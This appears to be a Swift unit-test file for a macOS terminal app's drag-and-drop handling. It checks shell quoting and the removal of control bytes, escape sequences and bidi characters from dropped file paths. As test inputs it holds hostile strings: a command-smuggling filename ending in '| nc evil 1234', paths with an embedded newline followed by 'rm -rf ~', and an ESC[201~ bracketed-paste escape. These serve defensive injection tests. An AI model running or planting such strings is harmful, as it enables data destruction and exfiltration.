import XCTest
import AppKit
@testable import Blackbird

final class DragDropTests: XCTestCase {
    /// `shellQuote` wraps a path in single quotes and escapes embedded singles.
    func testShellQuoteSimple() {
        XCTAssertEqual(TerminalView.shellQuote("/Users/foo/bar.png"),
                       "'/Users/foo/bar.png'")
    }

    func testShellQuoteWithSpaces() {
        XCTAssertEqual(TerminalView.shellQuote("/Users/foo/my image.png"),
                       "'/Users/foo/my image.png'")
    }

    func testShellQuoteWithEmbeddedSingleQuote() {
        // Classic POSIX recipe: close quote, escaped single, reopen.
        XCTAssertEqual(TerminalView.shellQuote("/tmp/don't.txt"),
                       "'/tmp/don'\\''t.txt'")
    }

    func testJoinedMultiFile() {
        let joined = TerminalView.joinedDroppedPaths([
            "/a/one.png",
            "/b/two three.png",
        ])
        XCTAssertEqual(joined, "'/a/one.png' '/b/two three.png'")
    }

    func testShellQuoteRejectsShellMetachars() {
        // Filenames can technically contain backticks, dollar signs,
        // semicolons, pipes. Single-quote wrapping neutralises all of
        // them — test verifies the quoter doesn't collapse anything.
        let name = "$(rm -rf ~) ; echo `whoami` | nc evil 1234"
        let quoted = TerminalView.shellQuote(name)
        // Metachars pass through literally; the outer single quotes
        // turn them into plain characters for the shell.
        XCTAssertTrue(quoted.hasPrefix("'"))
        XCTAssertTrue(quoted.hasSuffix("'"))
        XCTAssertTrue(quoted.contains("$(rm -rf ~)"))
    }

    func testShellQuote_emptyString() {
        // An empty-string path (edge-case from misbehaving
        // NSPasteboard reader) becomes just `''` — harmless when
        // pasted into the shell as a positional arg.
        XCTAssertEqual(TerminalView.shellQuote(""), "''")
    }

    func testJoinedDroppedPaths_emptyArray() {
        XCTAssertEqual(TerminalView.joinedDroppedPaths([]), "")
    }

    func testJoinedDroppedPaths_singleFile() {
        XCTAssertEqual(
            TerminalView.joinedDroppedPaths(["/only/one.txt"]),
            "'/only/one.txt'"
        )
    }

    // MARK: - Drop integration regressions
    //
    // Bug #19 / #20 / #21 cover the `performDragOperation` glue, not the
    // pure `shellQuote` / `joinedDroppedPaths` formatters above. The view
    // exposes `performDropOfPaths` as a test seam (NSDraggingInfo isn't
    // mockable: AppKit treats it specially and synthesised conformers
    // crash on the framework's internal `_concreteDraggingInfo` lookup),
    // and `pasteTextRecorderForTests` captures the pre-encoding string
    // the paste pipeline saw so we can assert quoting end-to-end.

    /// Regression: a drop while the shell has an active foreground
    /// child (claude, python, psql, vim, …) must be forwarded to that
    /// child, not refused. An earlier revision (Bug #19) gated drops on
    /// `hasForegroundChild()` and broke every interactive REPL — most
    /// painfully Claude Code, where dragging in an image path is a
    /// primary workflow. Terminal.app and iTerm2 both forward; we do
    /// too.
    func test_drop_duringForegroundCommand_accepted() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        session._testForegroundChildOverride = true
        view.session = session
        var pastes: [String] = []
        view.pasteTextRecorderForTests = { pastes.append($0) }

        let accepted = view.performDropOfPaths(["/tmp/example.txt"])

        XCTAssertTrue(accepted, "drop must be forwarded to the running command")
        XCTAssertEqual(pastes, ["'/tmp/example.txt'"],
                       "the quoted path should reach the paste pipeline regardless of foreground child state")
    }

    /// Baseline: with no foreground child, the drop is accepted by the
    /// shell. Pairs with the regression above — verifies behaviour is
    /// identical whether or not a child is running.
    func test_drop_withoutForegroundCommand_accepted() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        session._testForegroundChildOverride = false
        view.session = session
        var pastes: [String] = []
        view.pasteTextRecorderForTests = { pastes.append($0) }

        let accepted = view.performDropOfPaths(["/tmp/example.txt"])

        XCTAssertTrue(accepted)
        XCTAssertEqual(pastes, ["'/tmp/example.txt'"])
    }

    /// Bug #20: paths with shell metacharacters (spaces, $, backticks,
    /// quotes) must be single-quote-wrapped before reaching the shell.
    /// This is the integration check on top of `testShellQuoteWithSpaces`
    /// — verifies the wrapping happens through the drop entry point too,
    /// not just in the pure helper.
    func test_drop_quotesPathWithSpaces() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        view.session = session
        var pastes: [String] = []
        view.pasteTextRecorderForTests = { pastes.append($0) }

        view.performDropOfPaths(["/tmp/has spaces.txt"])

        XCTAssertEqual(pastes, ["'/tmp/has spaces.txt'"])
    }

    /// Bug #20 hardening: a path containing a single quote round-trips
    /// through the POSIX `'\''` recipe so the shell parses it as one
    /// argument, not two.
    func test_drop_quotesPathWithEmbeddedSingleQuote() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        view.session = session
        var pastes: [String] = []
        view.pasteTextRecorderForTests = { pastes.append($0) }

        view.performDropOfPaths(["/tmp/don't.txt"])

        XCTAssertEqual(pastes, ["'/tmp/don'\\''t.txt'"])
    }

    /// Bug #21: a drop must clear any in-flight IME composition before
    /// the path bytes leave for the PTY. Otherwise the preedit overlay
    /// hangs over the freshly-pasted text and the next IME keystroke
    /// commits the stale composition on top of the path.
    func test_drop_cancelsActiveIMEComposition() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        view.session = session
        // Install a preedit composition the way a real IME would —
        // setMarkedText is the sanctioned entry point and sets up
        // `view.composition` plus the overlay subview.
        view.setMarkedText("か",
                           selectedRange: NSRange(location: 1, length: 0),
                           replacementRange: NSRange(location: NSNotFound, length: 0))
        XCTAssertTrue(view.hasMarkedText(), "precondition: composition is active")

        view.performDropOfPaths(["/tmp/file.txt"])

        XCTAssertFalse(view.hasMarkedText(),
                       "drop must clear the IME preedit before pasting bytes")
    }

    // MARK: - Drop-path control-byte scrub (CVE-class)
    //
    // HFS+/APFS filenames legally contain C0 controls (LF, CR, ESC, …).
    // A hostile pasteboard provider — sandboxed peer app, NSPasteboard
    // synthesiser, or any process with the right entitlement — can hand
    // us a `file://` URL whose path embeds those bytes. `shellQuote`
    // wraps in single quotes but does NOT remove embedded controls;
    // the post-quote `pasteText` pipeline whitelists 0x0A / 0x0D as
    // legitimate paste (correct for user-typed paste from pbpaste-
    // style flows) and `convertLoneCRToLF` preserves the LF, so a
    // drop of `/tmp/x\nrm -rf ~` reaches the shell as Enter →
    // arbitrary command execution.
    //
    // Memory cost: each test allocates a single TerminalView + headless
    // session and one short-string paste; trivial — well under a kB.

    /// Embedded LF in a dropped URL's path must NOT survive into the
    /// paste payload. If 0x0A reached the shell at a bare prompt, the
    /// bytes after the newline would execute as a fresh command — one
    /// drag, arbitrary command execution.
    func test_drop_stripsEmbeddedLF_fromPath() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        view.session = session
        var pastes: [String] = []
        view.pasteTextRecorderForTests = { pastes.append($0) }

        // URL(fileURLWithPath:) accepts embedded LF — HFS+ filenames
        // legally contain it. `.path` round-trips the byte intact, so
        // this matches what a hostile pasteboard provider would deliver
        // through `readObjects(forClasses: [NSURL.self], ...)`.
        let hostile = URL(fileURLWithPath: "/tmp/x\nrm -rf ~")
        view.performDropOfPaths([Self.sanitizedDropPath(from: hostile)])

        XCTAssertEqual(pastes.count, 1, "exactly one paste should be issued")
        let payload = pastes[0]
        XCTAssertFalse(payload.unicodeScalars.contains(where: { $0.value == 0x0A }),
                       "LF (0x0A) must be stripped from dropped URL paths before quoting")
        XCTAssertFalse(payload.unicodeScalars.contains(where: { $0.value == 0x0D }),
                       "CR (0x0D) must not appear either")
    }

    /// Symmetric to the LF case: a CR byte (0x0D) embedded in a dropped
    /// URL path would survive `shellQuote`, then be turned into LF by
    /// `convertLoneCRToLF` in the non-bracketed paste path — same RCE.
    /// Strip CR for the same reason and at the same layer.
    func test_drop_stripsEmbeddedCR_fromPath() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        view.session = session
        var pastes: [String] = []
        view.pasteTextRecorderForTests = { pastes.append($0) }

        let hostile = URL(fileURLWithPath: "/tmp/x\rrm -rf ~")
        view.performDropOfPaths([Self.sanitizedDropPath(from: hostile)])

        XCTAssertEqual(pastes.count, 1)
        let payload = pastes[0]
        XCTAssertFalse(payload.unicodeScalars.contains(where: { $0.value == 0x0D }),
                       "CR (0x0D) must be stripped from dropped URL paths before quoting")
        XCTAssertFalse(payload.unicodeScalars.contains(where: { $0.value == 0x0A }),
                       "no LF should be introduced either (would be created by the CR→LF converter downstream)")
    }

    /// ESC (0x1B) embedded in a dropped path would re-introduce the
    /// paste-injection class fixed by `sanitizeBracketedPaste`: an
    /// attacker emits a path containing `ESC[201~ rm -rf ~` to close
    /// the bracketed-paste window early and execute the trailing
    /// bytes. The drop layer is the right place to catch this — once
    /// the ESC reaches the paste pipeline the shellQuote single-quote
    /// wrap doesn't help (the ESC byte is preserved verbatim).
    func test_drop_stripsEmbeddedESC_fromPath() throws {
        let view = try XCTUnwrap(TerminalView.makeHeadlessForTests())
        let session = TerminalSession.makeHeadlessForTests()
        view.session = session
        var pastes: [String] = []
        view.pasteTextRecorderForTests = { pastes.append($0) }

        let hostile = URL(fileURLWithPath: "/tmp/x\u{001B}[201~rm -rf ~")
        view.performDropOfPaths([Self.sanitizedDropPath(from: hostile)])

        XCTAssertEqual(pastes.count, 1)
        let payload = pastes[0]
        XCTAssertFalse(payload.unicodeScalars.contains(where: { $0.value == 0x1B }),
                       "ESC (0x1B) must be stripped from dropped URL paths before quoting")
    }

    /// Belt-and-braces unit check on the helper itself: every C0 byte
    /// (0x00–0x1F) plus DEL (0x7F) must be removed; printable bytes
    /// pass through unchanged.
    func test_sanitizeDropPath_stripsC0AndDEL() {
        let raw = "/a\u{0000}b\u{0009}c\u{000A}d\u{000D}e\u{001B}f\u{001F}g\u{007F}h"
        let scrubbed = TerminalView.sanitizeDropPath(raw)
        for scalar in scrubbed.unicodeScalars {
            XCTAssertFalse(scalar.value < 0x20 || scalar.value == 0x7F,
                           "C0/DEL byte 0x\(String(scalar.value, radix: 16)) survived sanitizeDropPath")
        }
        XCTAssertEqual(scrubbed, "/abcdefgh",
                       "non-control bytes must pass through untouched, in order")
    }

    /// S4-014: bidi / zero-width / invisible scalars in a dropped path
    /// must be stripped. A pasteboard provider (sandboxed peer, web
    /// drag) can hand a `file://` URL whose path contains U+202E
    /// RIGHT-TO-LEFT OVERRIDE — the pasted shell-quoted line then
    /// visually misrepresents the actual filename the shell receives.
    /// Same Trojan-source class as the DiagnosticsView Copy fix
    /// (S4-002).
    func test_sanitizeDropPath_stripsBidiAndInvisible() {
        let raw = "/tmp/\u{202E}gpj.dab.jpg\u{200B}/file\u{FEFF}.txt"
        let scrubbed = TerminalView.sanitizeDropPath(raw)
        let forbidden: Set<Unicode.Scalar> = [
            "\u{202E}", "\u{200B}", "\u{FEFF}", "\u{202D}", "\u{2066}",
            "\u{2067}", "\u{2068}", "\u{2069}", "\u{200E}", "\u{200F}",
            "\u{00AD}",
        ]
        for scalar in scrubbed.unicodeScalars {
            XCTAssertFalse(forbidden.contains(scalar),
                           "bidi/invisible scalar U+\(String(scalar.value, radix: 16)) survived sanitizeDropPath")
        }
        // Visible non-control bytes survive in order.
        XCTAssertEqual(scrubbed, "/tmp/gpj.dab.jpg/file.txt",
                       "non-control / non-bidi scalars must pass through untouched, in order")
    }

    // MARK: - Variation selectors are NOT Trojan-source (must be preserved)
    //
    // Unicode Variation Selectors (VS1-16 = U+FE00–U+FE0F, VS17-256 =
    // U+E0100–U+E01EF) only alter the rendering of the immediately-
    // preceding visible glyph. They cannot reorder text, escape quotes,
    // or inject control bytes, so they are NOT part of the Trojan-source
    // / invisible-control attack class that `sanitizeDropPath` and
    // `stripBidiOverrides` defend against. They ARE legitimate, common
    // user-chosen content (emoji filenames, pasted emoji, keycaps), so
    // both sanitizers MUST preserve them verbatim. An earlier revision
    // over-broadly stripped VS, mangling emoji paths and pastes — these
    // tests pin the corrected, narrower scrub policy.
    //
    // Memory/time cost: each test allocates one short String or a handful
    // of 5–6-byte Data buffers; sub-millisecond, no meaningful allocation.

    /// Regression: `sanitizeDropPath` must preserve VS16 (U+FE0F), the
    /// emoji-presentation selector that turns a base glyph into its
    /// colour emoji form. Dropping a file literally named "❤️.png"
    /// (U+2764 HEAVY BLACK HEART + U+FE0F) must reach the shell with the
    /// selector intact; stripping it changes the byte sequence the shell
    /// receives and the file no longer exists under the scrubbed name.
    /// A keycap sequence ("1️⃣" = '1' + U+FE0F + U+20E3) is the same case.
    func test_sanitizeDropPath_preservesVariationSelector16() {
        let heart = "/tmp/dir/❤\u{FE0F}.png"
        let scrubbedHeart = TerminalView.sanitizeDropPath(heart)
        XCTAssertTrue(scrubbedHeart.unicodeScalars.contains("\u{FE0F}"),
                      "VS16 (U+FE0F) must survive sanitizeDropPath — it is not a Trojan-source scalar")
        XCTAssertEqual(scrubbedHeart, heart,
                       "an emoji-presentation path must round-trip through sanitizeDropPath unchanged")

        let keycap = "/tmp/1\u{FE0F}\u{20E3}.txt"
        let scrubbedKeycap = TerminalView.sanitizeDropPath(keycap)
        XCTAssertTrue(scrubbedKeycap.unicodeScalars.contains("\u{FE0F}"),
                      "VS16 inside a keycap sequence must survive sanitizeDropPath")
        XCTAssertEqual(scrubbedKeycap, keycap,
                       "a keycap-sequence path must round-trip through sanitizeDropPath unchanged")
    }

    /// Regression: `sanitizeDropPath` must preserve the high
    /// variation-selector block VS17-256 (U+E0100–U+E01EF), used for
    /// CJK ideographic variation. A path containing U+E0100 must
    /// round-trip unchanged — the scalar is rendering-only and carries
    /// no reordering or control-byte capability.
    func test_sanitizeDropPath_preservesVariationSelector17_256() {
        let raw = "/tmp/x\u{E0100}.log"
        let scrubbed = TerminalView.sanitizeDropPath(raw)
        XCTAssertTrue(scrubbed.unicodeScalars.contains("\u{E0100}"),
                      "VS17 (U+E0100) must survive sanitizeDropPath — it is not a Trojan-source scalar")
        XCTAssertEqual(scrubbed, raw,
                       "a path with a high variation selector must round-trip unchanged")
    }

    /// Regression: `stripBidiOverrides` must preserve every VS1-16
    /// scalar (U+FE00–U+FE0F, UTF-8 `EF B8 80..8F`). Wrapping "a<VS>b"
    /// must come back as the identical 5 bytes — NOT collapsed to "ab".
    /// This is the paste-pipeline twin of the sanitizeDropPath case:
    /// Cmd-V of emoji text must not lose its presentation selector.
    func test_stripBidiOverrides_preservesVariationSelectors1to16() {
        for vs: UInt8 in 0x80...0x8F {
            let input = Data([0x61, 0xEF, 0xB8, vs, 0x62])
            XCTAssertEqual(
                PasteSanitizer.stripBidiOverrides(input), input,
                "VS at byte EF B8 \(String(vs, radix: 16, uppercase: true)) must be PRESERVED, not stripped"
            )
        }
    }

    /// Regression: `stripBidiOverrides` must preserve the high
    /// variation-selector block VS17-256. U+E0100 (`F3 A0 84 80`) and
    /// U+E01EF (`F3 A0 87 AF`) — the range endpoints — must each come
    /// back byte-for-byte. These four-byte scalars share the `F3 A0`
    /// lead with the Plane-14 tag block (which IS stripped), so this
    /// guards the boundary between the two sub-ranges.
    func test_stripBidiOverrides_preservesVariationSelectors17to256() {
        let vs17 = Data([0x61, 0xF3, 0xA0, 0x84, 0x80, 0x62]) // U+E0100
        XCTAssertEqual(PasteSanitizer.stripBidiOverrides(vs17), vs17,
                       "VS17 (U+E0100) must be PRESERVED, not stripped")
        let vs256 = Data([0x61, 0xF3, 0xA0, 0x87, 0xAF, 0x62]) // U+E01EF
        XCTAssertEqual(PasteSanitizer.stripBidiOverrides(vs256), vs256,
                       "VS256 (U+E01EF) must be PRESERVED, not stripped")
    }

    /// Anti-false-positive guard: preserving variation selectors must NOT
    /// have come at the cost of disabling the genuine Trojan-source scrub.
    /// Feed a payload that interleaves a preserved VS with two genuine
    /// invisibles — `a` + U+202E (RLO, `E2 80 AE`) + U+FE0F (VS, `EF B8
    /// 8F`) + U+200B (ZWSP, `E2 80 8B`) + `b` — and assert the result is
    /// exactly `a` + U+FE0F + `b`. If this passed merely because all
    /// stripping was turned off, the RLO and ZWSP would survive and the
    /// assertion would fail; if VS stripping regressed, the VS would be
    /// gone. Only the correct, selective policy yields these 5 bytes.
    func test_stripBidiOverrides_stillStripsGenuineInvisibles_alongsideVS() {
        let payload = Data([
            0x61,             // 'a'
            0xE2, 0x80, 0xAE, // U+202E RIGHT-TO-LEFT OVERRIDE  (must strip)
            0xEF, 0xB8, 0x8F, // U+FE0F VARIATION SELECTOR-16   (must keep)
            0xE2, 0x80, 0x8B, // U+200B ZERO WIDTH SPACE        (must strip)
            0x62,             // 'b'
        ])
        let expected = Data([0x61, 0xEF, 0xB8, 0x8F, 0x62]) // "a" + U+FE0F + "b"
        XCTAssertEqual(
            PasteSanitizer.stripBidiOverrides(payload), expected,
            "RLO + ZWSP must be stripped while the interleaved VS16 is preserved"
        )
    }

    /// Helper: take the same code path as `performDragOperation` —
    /// `url.path` -> `sanitizeDropPath` — so the integration tests
    /// above exercise the production scrubber rather than re-implementing
    /// it inline. Keeps the scrub policy in one place.
    private static func sanitizedDropPath(from url: URL) -> String {
        TerminalView.sanitizeDropPath(url.path)
    }
}
